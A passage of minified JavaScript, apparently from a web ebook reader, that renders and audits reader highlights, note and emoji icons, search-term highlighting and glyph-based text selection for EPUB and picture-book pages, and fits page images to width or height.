                                            return n = h(this), VST.sharedEpubModule.FindHighlightGUIDInClassString(this.className), n.css({
                                                backgroundColor: "transparent",
                                                borderBottom: "2px solid " + n.css("background-color")
                                            }), n.hasClass("vst-shared-highlight") ? n.attr("data-subscription", !0) : void 0
                                    });
                                    try {
                                        return f.auditHighlights(f.highlights)
                                    } catch (c) {}
                                }
                            })
                        }), VST.trigger("highlights:render")
                    })
            }));
            var f
        },
        auditHighlights: (v = this, function(e) {
            var t,
                n,
                o,
                i,
                r,
                a,
                s,
                l,
                c,
                u,
                d,
                f,
                h,
                p,
                g,
                m;
            for (v.sortedHighlights = e.sort(function(e, t) {
                return VST.Utils.compareCFIs(e.cfi, t.cfi)
            }), t = [], s = 0, l = (p = v.sortedHighlights).length; s < l; s++)
                if ((a = p[s]).cfi) {
                    if (f && f.cfi === a.cfi)
                        ;
                    else if (n = {}, o = a.cfi.split("!"), n.contentDoc = o[0], n.relative = o[1], g = n.relative.split("/"), n.paragraphNode = g.slice(0, -1).join("/") + "/", d = g.slice(-1)[0].split(","), n.textNode = d[0], n.offset = d.slice(1).join(","), f && n.contentDoc === h.contentDoc && n.paragraphNode === h.paragraphNode)
                        if (n.textNode === h.textNode)
                            ;
                        else {
                            for (i = {
                                error: !0
                            }; n.textNode % 2 == 1 && i.error && (m = (u = (c = (i = VST.sharedEpubModule.locateCFISubpathFromNode(n.paragraphNode + n.textNode, VST.document.firstElementChild, VST.document.firstElementChild)).node).innerText || c.textContent).indexOf(a.selectedText), !(n.textNode <= 1));)
                                (i.error || m < 0) && (n.textNode -= 2);
                            u === a.selectedText || 0 <= m && (r = n.contentDoc + "!" + n.paragraphNode + n.textNode + ",:" + m + ",:" + (m + a.selectedText.length)) !== a.cfi && t.push({
                                name: "SVGHighlightIssueV2",
                                isbn: a.isbn,
                                cfi: VST.sharedEpubModule.StripCFIAssertions(a.cfi),
                                syncId: a.syncId,
                                selectedText: a.selectedText,
                                correctedCFI: VST.sharedEpubModule.StripCFIAssertions(r),
                                timestamp: (new Date).getTime()
                            })
                        }
                    f = a,
                    h = n
                }
            if (0 < t.length)
                return Jigsaw.socketMethods.local.addEvents.method(t), t
        })
    }
}.call(this),
function() {
    VST.$,
    VST.Dash = {
        contentReady: function(e, t, n) {
            if (VST.Loading.contentReady(e, t, n), VST.Loading.isMainReadingWindow(e))
                return this.highlightCurrentHighlights(null != n ? n.cfi : void 0)
        },
        highlightRenderer: function(e) {
            return new VST.Dash.HighlightRenderer(e, VST.document.body.children[0].getAttribute("o"))
        },
        highlightCurrentHighlights: function() {
            return Jigsaw.socket.highlightsEnabled(function(e) {
                if (e)
                    return VST.Book.getCurrentPage(function(e, d) {
                        return VST.Book.getHighlights(function(e, t) {
                            var n,
                                o,
                                i,
                                r,
                                a,
                                s,
                                l,
                                c,
                                u;
                            for (u = [], o = 0, r = (s = t.highlights).length; o < r; o++)
                                (n = s[o]).chapterCfi === d.getCFI() && u.push(n);
                            for (new VST.Dash.HighlightRenderer(u, VST.document.body.children[0].getAttribute("o")).render(VST.document.body), c = [], i = 0, a = (l = t.subscribedHighlights).length; i < a; i++)
                                (n = l[i]).chapterCfi === d.getCFI() && c.push(n);
                            return new VST.Dash.HighlightRenderer(c, VST.document.body.children[0].getAttribute("o"), !0).render(VST.document.body), VST.trigger("highlights:render")
                        })
                    })
            })
        }
    }
}.call(this),
function() {
    var f;
    f = VST.$,
    VST.Handler.set("selection", function(e, t) {
        var n,
            o,
            i;
        return n = VST.Models.Highlight.defaultSelectionHandler, VST.Book && VST.Book.isPBK() && (i = VST.PictureBook.selection.getSelectedText()) && "" !== i ? (o = VST.Event.fromjQueryEvent("book:selectionMade", e, t), VST.EventDispatcher.fire(o, i)) : n(e, t)
    }),
    VST.Handler.set("VST.Utils.getSelectedText", function() {
        return VST.Book.isPBK() ? VST.PictureBook.selection.getSelectedText() : VST.Utils.defaultGetSelectedTextHandler()
    }),
    VST.PictureBook = {
        contentReady: function(e, t, n) {
            if (VST.Loading.isMainReadingWindow(e))
                return this.insertNextAndPreviousPage(n), this.watchImageLoad(e, t), this.words = n && n.words, delete this.normalizedWords, delete this.alreadyNormal, delete this.gRenderer, delete this.selection, this.gRenderer = new this.GlyphRenderer(t, n.glyphs), this.selection = new this.TextSelection(t, this.gRenderer, this.words), this.lRenderer = new this.LinkRenderer(n.links), VST.Loading.contentReady(e, t, n), this.highlightCurrentHighlights(t, n.index, this.gRenderer), this.lRenderer.render()
        },
        insertNextAndPreviousPage: function(e) {
            var t,
                n,
                o;
            if (null == e && (e = {}), t = document.getElementById("epub-container"), n = Jigsaw.getContainerDimensions().width, o = "?width=" + this.bestWidthForContainerWidth(n), e.prevPage && !document.getElementById("prev-page") && t.appendChild(this.createIframe("prev-page", e.prevPage.absoluteURL + o)), e.nextPage && !document.getElementById("next-page"))
                return t.appendChild(this.createIframe("next-page", e.nextPage.absoluteURL + o))
        },
        createIframe: function(e, t) {
            var n;
            return (n = document.createElement("iframe")).setAttribute("id", e), n.setAttribute("src", t), n.setAttribute("allowtransparency", "true"), n.setAttribute("frameborder", "0"), n.setAttribute("scrolling", "auto"), n.setAttribute("height", "100%"), n.setAttribute("width", "100%"), n.style.display = "none", n
        },
        fitToHeightOnPageResize: function() {
            if ("height" === VST.fitMode)
                return VST.$(VST.document).find("img#pbk-page").css({
                    height: Jigsaw.getContainerDimensions().height + "px",
                    width: "auto"
                })
        },
        fitToHeight: function() {
            return this.fitToHeightOnPageResize(), VST.unbind("page:resize", this.fitToWidthOnPageResize), VST.unbind("page:resize", this.fitToHeightOnPageResize), VST.bind("page:resize", this.fitToHeightOnPageResize), VST.trigger("page:resize"), VST.fitMode = "height", zoomPDF("normal"), VST.fire("page:transform", Jigsaw.getContainerDimensions())
        },
        fitToWidthOnPageResize: function() {
            if ("width" === VST.fitMode)
                return VST.$(VST.document).find("img#pbk-page").css({
                    height: "auto",
                    width: "100%"
                })
        },
        fitToWidth: function() {
            return this.fitToWidthOnPageResize(), VST.unbind("page:resize", this.fitToWidthOnPageResize), VST.unbind("page:resize", this.fitToHeightOnPageResize), VST.bind("page:resize", this.fitToWidthOnPageResize), VST.trigger("page:resize"), VST.fitMode = "width", zoomPDF("normal"), VST.fire("page:transform", Jigsaw.getContainerDimensions())
        },
        watchImageLoad: function(o, i) {
            var t,
                e,
                r,
                n,
                a,
                s;
            try {
                f(VST.document).find("#pbk-page")
            } catch (l) {
                return
            }
            if (r = i.getElementById("pbk-page"), s = this, n = function() {
                var e,
                    t,
                    n;
                try {
                    f(VST.document).find("#pbk-page")
                } catch (l) {
                    return
                }
                if (i = VST.document, r = i.getElementById("pbk-page"), f(i).find(".pbk-overlay").css({
                    height: r.height + "px",
                    width: r.width + "px",
                    marginBottom: "-" + r.height + "px"
                }), n = Jigsaw.getContainerDimensions().width, (t = f("#epub-content").css("transform").match(/-?[\d\.]+/g)) && (n *= t[0]), e = s.bestWidthForContainerWidth(n), parseInt(r.getAttribute("data-width"), 10) !== e)
                    return r.setAttribute("data-width", e), r.setAttribute("src", r.getAttribute("src").replace(/\/(\d+)$/, "/" + e))
            }, t = function() {
                var e,
                    t,
                    n;
                return delete (e = QueryString.parse(o.location.search)).create, t = QueryString.stringify(e), n = o.location.origin + o.location.pathname, t && (n += "?" + t), o.location.assign(n)
            }, e = function(e) {
                return r.style.display = "none", f.ajax({
                    url: e.target.src,
                    error: function(e) {
                        if (428 !== e.status)
                            return r.style.display = null
                    },
                    statusCode: {
                        428: function() {
                            var e;
                            if (!i.getElementById("recaptcha"))
                                return (e = i.createElement("iframe")).id = "recaptcha", e.className = "favre-ignore", e.src = "/books/" + VST.Book.getISBN() + "/recaptcha", e.style.position = "absolute", e.style.top = "0", e.style.left = "0", e.style.width = "100vw", e.style.height = "100vh", e.style.border = "none", e.style.zIndex = "100", i.body.appendChild(e), e.contentWindow.onRecaptcha = t, e.contentWindow.VST = VST, i.getElementById("pdf-ax-text").style.display = "none"
                        }
                    }
                })
            }, r)
                return r.onload = n, r.onerror = e, f(o).off("resize"), Jigsaw.unbind("page:resize"), VST.unbind("page:transform"), f(o).on("resize", n), Jigsaw.bind("page:resize", n), a = null, VST.bind("page:transform", function() {
                    return clearTimeout(a), a = setTimeout(n, 250)
                })
        },
        bestWidthForContainerWidth: function(e) {
            var t,
                n,
                o,
                i,
                r,
                a,
                s,
                l,
                c;
            if (l = [800, 1600, 2e3], VST.document) {
                o = VST.document;
                try {
                    r = f(o).find("#pbk-page")
                } catch (u) {
                    return
                }
                e < (a = (r = o.getElementById("pbk-page")).width) && (e = a),
                e < (n = r.getBoundingClientRect().width) && (e = n)
            }
            for (t = l[l.length - 1], i = s = l.length - 1; 0 <= s; i = s += -1)
                e < (c = l[i]) && (t = c);
            return t
        },
        renderOneHighlight: function(e) {
            return this.hRenderer.renderOneHighlight(e)
        },
        prettifyNoteIcon: function(e, t) {
            return this.hRenderer.prettifyNoteIcon(e, t)
        },
        findTermsWithoutNormalization: function(e, t) {
            var n,
                o,
                i,
                r,
                a,
                s;
            for (r = [], o = 0, i = t.length; o < i; o++)
                for (s = t[o], a = new RegExp(s, "gi"); n = a.exec(this.words);)
                    r.push([n.index, n.index + s.length - 1]);
            return r
        },
        getText: function() {
            return this.words
        },
        highlightNodes: function(e, i, r, t) {
            var a,
                s,
                n,
                o,
                l,
                c,
                u,
                d;
            if (null == r && (r = ""), null == t && (t = "pbk-search"), d = VST.document.getElementById(t), 0 < e.length) {
                for (c = [], n = 0, o = e.length; n < o; n++)
                    u = e[n],
                    c.push(function() {
                        var e,
                            t,
                            n,
                            o;
                        for (o = [], s = e = t = u[0], n = u[1]; (t <= n ? e <= n : n <= e) && (a = this.gRenderer.glyphs[s]); s = t <= n ? ++e : --e)
                            (l = this.gRenderer.createNode(a)).style.background = i,
                            l.style.opacity = "0.3",
                            l.setAttribute("data-glyph", s),
                            f(l).addClass(r),
                            o.push(d.appendChild(l));
                        return o
                    }.call(this));
                return c
            }
        },
        highlightTerms: function(e, t, n) {
            var o,
                i,
                r,
                a,
                s,
                l,
                c,
                u,
                d,
                f,
                h,
                p,
                g,
                m;
            for (null == n && (n = ""), m = VST.document.getElementById("pbk-search"), VST.Utils.isArray(e) || (e = [e]), g = [], r = 0, s = e.length; r < s; r++)
                p = e[r],
                g.indexOf(p) < 0 && g.push(p);
            if (e = g, this.words.normalize) {
                for (d = [], this.normalizedWords = this.normalizedWords || this.words.normalize(), this.alreadyNormal = this.words.length === this.normalizedWords.length, a = 0, l = e.length; a < l; a++)
                    if (!((p = e[a]).length <= 2))
                        for (p = p.normalize(), f = new RegExp("\\b" + p + "\\b", "gi"); i = f.exec(this.normalizedWords);)
                            if (this.alreadyNormal)
                                d.push([i.index, i.index + p.length - 1]);
                            else {
                                for (o = this.normalizedWords.slice(0, i.index), c = this.words.slice(0, Math.min(2 * i.index, this.words.length - 1)); o.normalize() !== c.normalize() && 0 < c.length;)
                                    c = c.substring(0, c.length - 1);
                                for (h = i.index + c.length - o.length, u = this.words.slice(h, h + 2 * p.length); p.length !== u.normalize().length && 0 < u.length;)
                                    u = u.substring(0, u.length - 1);
                                d.push([h, h + u.length - 1])
                            }
            } else
                d = this.findTermsWithoutNormalization(m, e, t);
            return this.highlightNodes(d, t, n)
        },
        unhighlightTerms: function(e) {
            var t,
                n;
            if (null == e && (e = "pbk-search"), n = VST.document.getElementById(e)) {
                for (t = []; n.hasChildNodes();)
                    t.push(n.removeChild(n.lastChild));
                return t
            }
        },
        highlightCurrentHighlights: function(d, f, h) {
            return VST.Book.getHighlights((p = this, function(e, t) {
                var n,
                    o,
                    i,
                    r,
                    a,
                    s,
                    l,
                    c,
                    u;
                if (!e) {
                    for (c = [], o = 0, r = (s = t.highlights).length; o < r; o++)
                        (n = s[o]).startPage === f && (t.markers && n.markerId && (n.marker = t.markers.find(function(e) {
                            return e.globalId === n.markerId
                        })), c.push(n));
                    for (h || (h = p.gRenderer), p.hRenderer = new p.HighlightRenderer(d, c, h), p.hRenderer.render(), u = [], i = 0, a = (l = t.subscribedHighlights).length; i < a; i++)
                        (n = l[i]).startPage === f && u.push(n);
                    return new p.HighlightRenderer(d, u, h, !0).render(), VST.trigger("highlights:render")
                }
            }));
            var p
        },
        getDataForPageHighlight: function(e) {
            return this.hRenderer.getDataForHighlight(e)
        }
    }
}.call(this),
function() {
    var d;
    d = VST.$,
    VST.Highlights = {
        addHighlightCSS: function() {
            var e;
            return (e = VST.document.createElement("style")).setAttribute("type", "text/css"), e.innerText = ".vsthighlight { cursor: pointer; } .disabledHighlight { background: #ECECEC !important; border-color: #B3B3B3 !important; cursor: default !important; } .disabledHighlight.vst-shared-highlight { background: transparent !important; }", VST.document.body.appendChild(e)
        },
        getHighlightDataForCurrentSelection: function() {
            var a,
                e,
                t,
                n,
                o,
                i,
                r,
                s,
                l,
                c,
                u,
                d;
            if (e = {}, VST.Book.isPBK() ? e.selected_text = VST.PictureBook.selection.getSelectedText() : e.selected_text = VST.Utils.getSelectedText(), "" === e.selected_text)
                return null;
            if (VST.Book.isEpub())
                a = "",
                VST.Book.getPages(function(e, t) {
                    var n,
                        o,
                        i,
                        r;
                    for (o = 0, i = t.length; o < i; o++)
                        r = t[o],
                        -1 !== VST.document.URL.indexOf(r.getPath()) && (n = r);
                    return a = n.getCFI()
                }),
                e.cfi = a.split("!")[0] + "!",
                e.cfi += VST.sharedEpubModule.GetCFIRangeStringForSelection();
            else if (VST.Book.isDash()) {
                if (e.selected_text = e.selected_text.replace(/\n+/g, "").replace(/\s+/, " "), VST.Utils.getSelectionObject().parentElement)
                    ;
                else if ((c = (s = VST.Utils.getRangeObject()).startContainer).getAttribute && (r = c.getAttribute("o")))
                    e.chapter_offset = parseInt(r, 10) + s.startOffset;
                else
                    for (i = c; i = i.parentNode;)
                        if (o = i.getAttribute("o")) {
                            o = parseInt(o, 10),
                            d = c.textContent,
                            n = i.textContent.indexOf(d),
                            e.chapter_offset = 0 <= n ? o + n + s.startOffset : o + s.startOffset;
                            break
                        }
                e.end_offset = e.chapter_offset + e.selected_text.length,
                e.selection_length = e.selected_text.length,
                e.chapter_title = VST.currentPageData.chapterTitle
            } else
                l = VST.PictureBook.selection,
                e.start_label = VST.currentPageData.page,
                e.end_label = VST.currentPageData.page,
                e.chapter_offset = l.startIndex,
                e.end_offset = e.chapter_offset + e.selected_text.length,
                e.start_page = VST.currentPageData.index,
                e.end_page = VST.currentPageData.index,
                u = l.centerCoordinatesForStart(),
                t = l.centerCoordinatesForEnd(),
                e.start_x = u.x,
                e.start_y = u.y,
                e.end_x = t.x,
                e.end_y = t.y,
                e.chapter_title = VST.currentPageData.chapterTitle;
            return e
        },
        setNodeAttributes: function(e, t) {
            if (t.chapterOffset && e.setAttribute("data-offset", t.chapterOffset), t.endOffset && e.setAttribute("data-end-offset", t.endOffset), t.syncId && e.setAttribute("data-guid", t.syncId), t.markerId && e.setAttribute("data-marker-guid", t.markerId), t.noteText && e.setAttribute("data-note-text", t.noteText), t.selectedText && e.setAttribute("data-selected-text", t.selectedText), t.subscribed)
                return e.setAttribute("data-subscription", t.subscribed)
        },
        findNoteIconNode: function(e) {
            return d(VST.document).find("." + VST.Models.Highlight.Settings.noteIconClass + ".highlight_" + e).not(".vstemojiwrapper")[0]
        },
        findEmojiIconWrapperNode: function(e) {
            var t,
                n;
            return t = (n = VST.Models.Highlight && VST.Models.Highlight.Settings.emojiWrapperClass) && n.split(" ").join("."), d(VST.document).find("." + t + ".highlight_" + e)[0]
        },
        isEmojiMarker: function(e) {
            return e && "Emoji Note Marker" === e.label
        },
        updateHighlight: function(e, t) {
            var n,
                o,
                i,
                r,
                a,
                s,
                l,
                c,
                u;
            if (0 < (u = d(VST.document).find("." + VST.Models.Highlight.Settings.highlightClass + ".highlight_" + e)).length) {
                for (a = 0, s = u.length; a < s; a++)
                    c = u[a],
                    this.setNodeAttributes(c, t);
                if (o = this.findNoteIconNode(e), n = this.findEmojiIconWrapperNode(e), (i = this.getEmoji(t.noteText)) && this.isEmojiMarker(t.marker) ? (d(u[1]).css({
                    backgroundColor: "none"
                }), n ? n.firstChild.innerHTML = i : (r = this.emojiIconWrapperNode(i, t.syncId), u[0].parentNode.insertBefore(r, u[0]))) : (t.shared || u.css({
                    "border-bottom": "none",
                    backgroundColor: t.vstColor
                }), n && n.remove()), t.hasNote && !this.isEmojiMarker(t.marker)) {
                    if (o && o.setAttribute("style", "display:none;"), l = this.noteIconNode(t), VST.Book.isPBK() && VST.PictureBook.prettifyNoteIcon(l, t), u[0].parentNode.insertBefore(l, u[0]), o)
                        return o.parentNode.removeChild(o)
                } else if (o)
                    return o.parentNode.removeChild(o)
            }
        },
        removeAllHighlights: function() {
            return this.removeHighlight()
        },
        removeHighlight: function(e, t) {
            var n,
                o,
                i,
                r,
                a,
                s,
                l,
                c,
                u;
            for (i = "." + VST.Models.Highlight.Settings.highlightClass, e && (i += ".highlight_" + e), t && (i += "." + t), u = [], r = 0, a = (l = d(VST.documents).find(i).get().reverse()).length; r < a; r++) {
                if (c = (s = l[r]).parentNode, /\bvstnoteindicator\b/.test(s.className.baseVal || s.className))
                    ;
                else
                    for (; 0 < s.childNodes.length;)
                        o = (n = s.childNodes[0]).cloneNode(!0),
                        c.insertBefore(o, s),
                        s.removeChild(n);
                u.push(c.removeChild(s))
            }
            return u
        },
        highlightClass: function(e) {
            return "vstignore vstskip vsthighlight highlight_" + e
        },
        getEmoji: function(e) {
            var t;
            return t = /(?:[\u2700-\u27bf]|(?:\ud83c[\udde6-\uddff]){2}|[\ud800-\udbff][\udc00-\udfff])[\ufe0e\ufe0f]?(?:[\u0300-\u036f\ufe20-\ufe23\u20d0-\u20f0]|\ud83c[\udffb-\udfff])?(?:\u200d(?:[^\ud800-\udfff]|(?:\ud83c[\udde6-\uddff]){2}|[\ud800-\udbff][\udc00-\udfff])[\ufe0e\ufe0f]?(?:[\u0300-\u036f\ufe20-\ufe23\u20d0-\u20f0]|\ud83c[\udffb-\udfff])?)*/, e && e.match(t) && e.match(t)[0]
        },
        emojiIconWrapperNode: function(e, t) {
            var n,
                o,
                i;
            return n = VST.document.createElement("span"), i = ["background: #fff", "position: absolute", "border-radius: 100%", "border: 1px solid #ECECEC", "box-shadow: 0 2px 4px 0 rgba(0, 0, 0, 0.2)", "width: 48px", "height: 48px", "text-align: center", "margin-top: -20px", "text-indent: 0", "z-index: 1", "right: 1%", "line-height: 48px", "font-family: Segoe UI Emoji"], o = "highlight_" + t + " " + VST.Models.Highlight.Settings.highlightClass, n.setAttribute("style", i.join("; ")), n.setAttribute("class", VST.Models.Highlight.Settings.emojiWrapperClass + " " + o), n.appendChild(this.emojiIconNode(e)), n
        },
        emojiIconNode: function(e, t) {
            var n,
                o;
            return n = ["font-size: 30px", "text-decoration: none", "line-height: 50px", "font-style: normal", "user-select: none"], (o = VST.document.createElement("span")).setAttribute("class", "emoji_" + t + " vstignore vstskip"), o.setAttribute("style", n.join("; ")), o.innerHTML = e, o
        },
        noteIconNode: function(e, t, n) {
            var o,
                i,
                r,
                a,
                s,
                l;
            for (o in n || (n = VST.document), t || (t = ""), t += " vstignore vsthighlightshared highlight_" + e.syncId + " " + VST.Models.Highlight.Settings.noteIconClass, (s = VST.Models.Highlight.Settings).svgIcon ? (a = n.createElement("span"), (l = n.createElementNS("http://www.w3.org/2000/svg", "svg")).setAttribute("height", "13"), l.setAttribute("width", "11"), l.setAttribute("viewBox", "0 0 8 10"), l.setAttribute("style", "vertical-align: top; position:absolute; top: 0; left: 0;"), l.innerHTML = "<title>notes_icon</title> <g fill='" + e.vstColorDark + "' fill-rule='evenodd'> <path d='M6.62 8.585H1.38v-7.17h5.24v7.17zM6.547.111H1.455a1.38 1.38 0 0 0-1.38 1.38v7.02a1.38 1.38 0 0 0 1.38 1.378h5.09a1.38 1.38 0 0 0 1.38-1.379V1.49A1.38 1.38 0 0 0 6.545.111z'/> <path d='M2.182 6.581h3.636v-.727H2.182zm0-2.182h3.636v-.727H2.182z'/> </g>", a.appendChild(l)) : a = n.createElement(s.tag || "span"), r = "background: " + e.vstColor + "; position: absolute; left: 10px;", s.svgIcon ? a.setAttribute("style", r + "margin-top: 3px; border-radius: 2px; width: 11px !important; height: 13px !important;") : a.setAttribute("style", r + "width: 11px !important; height: 11px; border: 3px solid " + e.vstColorDark + ";"), a.setAttribute("data-guid", e.syncId), a.setAttribute("data-has-note", e.hasNote), a.setAttribute("data-note-text", e.noteText), a.setAttribute("data-marker-guid", e.markerId), a.setAttribute("data-selected-text", e.selectedText), a.setAttribute("data-subscription", !!e.subscribed), i = s.attributes)
                a.setAttribute(o, i[o]);
            return a.setAttribute("class", t + " " + VST.Models.Highlight.Settings.highlightClass + " vstskip"), a
        },
        noteIconHandler: function(e, t, n) {
            var o,
                i,
                r;
            return o = t, (i = n.match(/vstcolordark([^\s]+)/)) && (o = "#" + i[1]), (r = n.match(/vstcolor([^\s]+)/)) && (t = "#" + r[1]), VST.Highlights.noteIconNode({
                vstColor: t,
                vstColorDark: o
            }, n, e)
        },
        renderCurrentHighlights: function() {
            var e;
            return VST.Book.isPBK() ? VST.PictureBook.highlightCurrentHighlights(null != (e = VST.currentPageData) ? e.index : void 0) : VST.Book.isDash() ? VST.Dash.highlightCurrentHighlights() : EpubBook.highlightCurrentHighlights()
        },
        focusHighlight: function(e) {
            return e ? (d(VST.document).find("." + VST.Models.Highlight.Settings.highlightClass).addClass("disabledHighlight"), d(VST.document).find("." + VST.Models.Highlight.Settings.highlightClass + ".highlight_" + e).removeClass("disabledHighlight")) : d(VST.document).find("." + VST.Models.Highlight.Settings.highlightClass).removeClass("disabledHighlight")
        },
        redrawHighlights: function(e) {
            if (d(VST.document).find("." + VST.Models.Highlight.Settings.highlightClass).removeClass("disabledHighlight"), this.removeAllHighlights(), this.renderCurrentHighlights(), e)
                return e()
        }
    }
}.call(this),
function() {
    VST.Dash = VST.Dash || {},
    VST.Dash.HighlightRenderer = function(e, t, n) {
        this.highlights = e,
        this.numberOfHighlightsOpen = 0,
        this.offset = parseInt(t, 10),
        this.subscribed = !!n,
        this.render = function(e) {
            for (var t = 0; t < this.highlights.length; t++)
                this.renderOneHighlight(e, this.highlights[t], 0)
        },
        this.renderOneHighlight = function(e, t, n) {
            var o = t.chapterOffset,
                i = t.endOffset;
            this.offset = parseInt(e.getAttribute("o") || n || this.offset, 10);
            for (var r = 0; r < e.childNodes.length; r++) {
                var a = e.childNodes[r];
                if (1 === a.nodeType)
                    this.renderOneHighlight(a, t);
                else {
                    if (/^\s*$/.test(a.nodeValue))
                        continue;
                    var s = this.getNodeValueLength(a),
                        l = this.shouldStartInNode(o, i, a),
                        c = this.shouldContinueInNode(o, i);
                    (l || c) && (r += this.insertHighlight(t, a, l)),
                    this.offset += s
                }
            }
        },
        this.getNodeValueLength = function(e) {
            return e.nodeValue.replace(/\n|\r|\n\r/g, "").replace(/\s+/g, " ").length
        },
        this.shouldStartInNode = function(e, t, n) {
            return e >= this.offset && e < this.getNodeValueLength(n) + this.offset
        },
        this.shouldContinueInNode = function(e, t) {
            return e < this.offset && t > this.offset
        },
        this.insertHighlight = function(e, t, n) {
            var o = t.parentNode,
                i = e.chapterOffset - this.offset;
            i < 0 && (i = 0);
            var r = e.endOffset - this.offset - i;
            r > t.nodeValue.length && (r = t.nodeValue.length);
            var a = i + r,
                s = t.nodeValue.substr(0, i),
                l = t.nodeValue.substr(i, r),
                c = t.nodeValue.substr(a),
                u = (o = t.parentNode, t.ownerDocument),
                d = u.createTextNode(c),
                f = u.createTextNode(s),
                h = u.createElement("span"),
                p = "background-color: ",
                g = VST.Models.Highlight.Settings.highlightClass + " vstignore vstskip highlight_" + e.syncId;
            this.subscribed && (p = "border-bottom: 2px solid ", g += " vsthighlightshared"),
            h.setAttribute("class", g);
            var m = this.subscribed ? e.vstColorDark : e.vstColor;
            h.setAttribute("style", p + m),
            VST.Highlights.setNodeAttributes(h, e),
            h.setAttribute("data-subscription", this.subscribed),
            h.setAttribute("aria-label", "highlighted text"),
            h.textContent = l,
            o.replaceChild(d, t),
            o.insertBefore(h, d),
            o.insertBefore(f, h);
            var v = 1;
            if (0 != s.length && v++, 0 != c.length && v++, n && e.hasNote) {
                v++;
                var T = VST.Highlights.noteIconNode(e, g);
                o.insertBefore(T, h)
            }
            return v
        }
    }
}.call(this),
function() {
    VST.PictureBook = VST.PictureBook || {},
    VST.PictureBook.HighlightRenderer = function(u, e, t, n) {
        this.highlights = e,
        this.subscriptions = !!n,
        this.renderer = t,
        this.glyphs = t.glyphs,
        this.render = function() {
            for (var e = 0; e < this.highlights.length; e++) {
                var t = this.highlights[e];
                this.drawOneHighlight(t)
            }
        },
        this.renderOneHighlight = function(e) {
            this.drawOneHighlight(e),
            this.highlights.push(e)
        },
        this.drawOneHighlight = function(e) {
            VST.Highlights.removeHighlight(e.syncId);
            var t,
                n = u.getElementById("pbk-penguins"),
                o = e.chapterOffset,
                i = e.endOffset,
                r = VST.Highlights.isEmojiMarker(e.marker) && VST.Highlights.getEmoji(e.noteText),
                a = 0;
            e.hasNote && (t = r ? VST.Highlights.emojiIconWrapperNode(r, e.syncId) : VST.Highlights.noteIconNode(e, VST.Highlights.highlightClass(e.syncId)), n.appendChild(this.prettifyNoteIcon(t, e)));
            for (var s = o; s < i; s++) {
                var l = this.glyphs[s];
                if (!l)
                    break;
                var c = this.renderer.createNode(l);
                r && (e.underlinedEmoji = !(a % 2), a++),
                n.appendChild(this.prettifyNode(c, e))
            }
            VST.Highlights.updateHighlight(e.syncId, e)
        },
        this.prettifyNode = function(e, t) {
            var n = t.marker && VST.Highlights.isEmojiMarker(t.marker) && VST.Highlights.getEmoji(t.noteText),
                o = this.subscriptions ? " vst-shared-highlight" : "",
                i = " border-bottom: 2px solid " + t.vstColorDark + ";",
                r = " background-color: " + t.vstColor + "; opacity: 0.3;";
            return n && (r = t.underlinedEmoji ? " border-bottom: #949494 2px dashed;" : " opacity: 0.3;"), r = this.subscriptions ? i : r, e.setAttribute("data-subscription", this.subscriptions), e.setAttribute("style", e.getAttribute("style") + r), e.setAttribute("class", e.getAttribute("class") + " " + VST.Highlights.highlightClass(t.syncId) + o), e.setAttribute("data-guid", t.syncId), e.setAttribute("data-has-note", t.hasNote), e
        },
        this.prettifyNoteIcon = function(e, t) {
            var n = this.findFirstLegitGlyphInHighlight(t);
            if (n)
                return e.setAttribute("style", e.getAttribute("style") + ";right: 1%; top: " + n.t + "%"), e
        },
        this.findFirstLegitGlyphInHighlight = function(e) {
            for (var t, n = e.chapterOffset, o = n + e.selectedText.length; n < o; n++)
                if (!(t = this.glyphs[n]).dup && t.r + t.l + .001 < 100)
                    return t;
            return t
        },
        this.getDataForHighlight = function(t) {
            return this.highlights.filter(function(e) {
                return e.syncId === t
            })[0]
        }
    }
}.call(this, VST.$),
function(i) {
    VST.PictureBook = VST.PictureBook || {},
    VST.PictureBook.TextSelection = function(e, t, n) {
        this.fuzzySelect = !1,
        this.doc = e,
        this.words = n,
        this.image = e.getElementById("pbk-page"),
        this.renderer = t,
        this.glyphs = this.renderer.glyphs,
        this.touchStartTimeout = null,
        this.noSelectMouseMoves = 0,
        this.selectionWrapper = e.getElementById("pbk-selection"),
        this.extrasWrapper = e.getElementById("pbk-extras"),
        this.startPos,
        this.endPos,
        this.selecting = !1,
        this.setupTextarea(e);
        var o = this;
        i(e).off(".pbksel").on("mousedown.pbksel", function(e) {
            o.onMouseDown(e)
        }).on("touchstart.pbksel", function(e) {
            o.onTouchStart(e)
        }).on("mousemove.pbksel touchmove.pbksel", function(e) {
            o.onMouseMove(e)
        }).on("mouseup.pbksel mouseleave.pbksel touchend.pbksel", function(e) {
            o.onMouseUp(e)
        }),
        this.deselectAll = function() {
            for (delete this.startIndex, delete this.endIndex, this.textarea.value = null; this.selectionWrapper.hasChildNodes();)
                this.selectionWrapper.removeChild(this.selectionWrapper.lastChild)
        },
        this.selectGlyph = function(e) {
            var t = e.cloneNode(!0);
            this.selectionWrapper.appendChild(t)
        },
        this.selectRange = function(e, t) {
            if (null == t && (t = e), t < e) {
                var n = t;
                t = e,
                e = n
            }
            if (null != this.startIndex && null != this.endIndex) {
                var o = {
                        number: 0
                    },
                    i = {
                        number: 0
                    };
                e > this.startIndex && (o.from = "start", o.number = e - this.startIndex),
                t < this.endIndex && (o.from = "end", o.number = this.endIndex - t),
                e < this.startIndex && (i.from = "start", i.number = this.startIndex - e),
                t > this.endIndex && (i.from = "end", i.number = t - this.endIndex);
                for (var r = 0; r < o.number; r++)
                    "start" === o.from ? this.selectionWrapper.firstChild && this.selectionWrapper.removeChild(this.selectionWrapper.firstChild) : this.selectionWrapper.lastChild && this.selectionWrapper.removeChild(this.selectionWrapper.lastChild);
                for (r = 1; r <= i.number; r++)
                    if ("start" === i.from) {
                        var a = this.glyphs[this.startIndex - r],
                            s = this.renderer.createNode(a);
                        this.selectionWrapper.firstChild ? this.selectionWrapper.insertBefore(s, this.selectionWrapper.firstChild) : this.selectionWrapper.appendChild(s)
                    } else {
                        a = this.glyphs[this.endIndex + r],
                        s = this.renderer.createNode(a);
                        this.selectionWrapper.appendChild(s)
                    }
            } else
                for (r = e; r <= t; r++) {
                    if (!(a = this.glyphs[r]))
                        break;
                    s = this.renderer.createNode(a);
                    this.selectionWrapper.appendChild(s)
                }
            this.startIndex = e,
            this.endIndex = t
        },
        this.centerForStart = function() {
            return this.centerForGlyphIndex(this.startIndex)
        },
        this.centerCoordinatesForStart = function() {
            return this.centerCoordinatesForGlyphIndex(this.startIndex)
        },
        this.centerForEnd = function() {
            return this.centerForGlyphIndex(this.endIndex)
        },
        this.centerCoordinatesForEnd = function() {
            return this.centerCoordinatesForGlyphIndex(this.endIndex)
